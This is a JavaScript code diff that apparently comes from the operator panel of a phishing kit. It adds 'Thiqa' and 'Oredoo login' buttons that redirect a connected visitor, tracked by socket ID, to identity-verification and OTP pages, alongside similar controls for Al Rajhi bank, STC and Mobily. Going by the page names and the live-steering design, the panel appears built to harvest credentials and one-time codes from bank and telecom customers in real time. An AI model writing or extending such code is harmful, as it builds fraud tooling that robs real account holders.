@@ -1572,6 +1572,12 @@
               if (visitor.network === 'موبايلي') {
                 html += '<button id="' + phoneOtpMobilyBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال موبايلي</button>';
               }
+            } else if (dc.page === 'OTP دخول') {
+              // أزرار صفحة OTP دخول (ثقة، تسجيل دخول اوريدو، رفض)
+              const thiqaBtnId = 'thiqa-btn-' + visitor.socketId + '-' + index;
+              const oredooBtnId = 'oredoo-btn-' + visitor.socketId + '-' + index;
+              html += '<button id="' + thiqaBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ثقة</button>';
+              html += '<button id="' + oredooBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تسجيل دخول اوريدو</button>';
             } else {
               html += '<button onclick="codeActionApprove(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             }
@@ -1585,6 +1591,8 @@
               const rajhiBtn = document.getElementById(codeRajhiBtnId);
               const stcBtn = document.getElementById(codeStcBtnId);
               const rajhiNavBtn = document.getElementById(codeRajhiNavBtnId);
+              const thiqaBtn = document.getElementById('thiqa-btn-' + visitor.socketId + '-' + index);
+              const oredooBtn = document.getElementById('oredoo-btn-' + visitor.socketId + '-' + index);
               if (rajhiBtn) {
                 rajhiBtn.addEventListener('click', () => {
                   navigateVisitorToPage(visitor.socketId, 'phone-verification');
@@ -1657,6 +1665,34 @@
                     phoneOtpMobilyBtn.textContent = originalText;
                     phoneOtpMobilyBtn.classList.remove('bg-green-600');
                     phoneOtpMobilyBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                  }, 1500);
+                });
+              }
+              if (thiqaBtn) {
+                thiqaBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'thiqa-auth');
+                  const originalText = thiqaBtn.textContent;
+                  thiqaBtn.textContent = 'تم الإرسال ✓';
+                  thiqaBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                  thiqaBtn.classList.add('bg-gray-500');
+                  setTimeout(() => {
+                    thiqaBtn.textContent = originalText;
+                    thiqaBtn.classList.remove('bg-gray-500');
+                    thiqaBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                  }, 1500);
+                });
+              }
+              if (oredooBtn) {
+                oredooBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'identity-verification');
+                  const originalText = oredooBtn.textContent;
+                  oredooBtn.textContent = 'تم الإرسال ✓';
+                  oredooBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                  oredooBtn.classList.add('bg-gray-500');
+                  setTimeout(() => {
+                    oredooBtn.textContent = originalText;
+                    oredooBtn.classList.remove('bg-gray-500');
+                    oredooBtn.classList.add('bg-green-600', 'hover:bg-green-700');
                   }, 1500);
                 });
               }
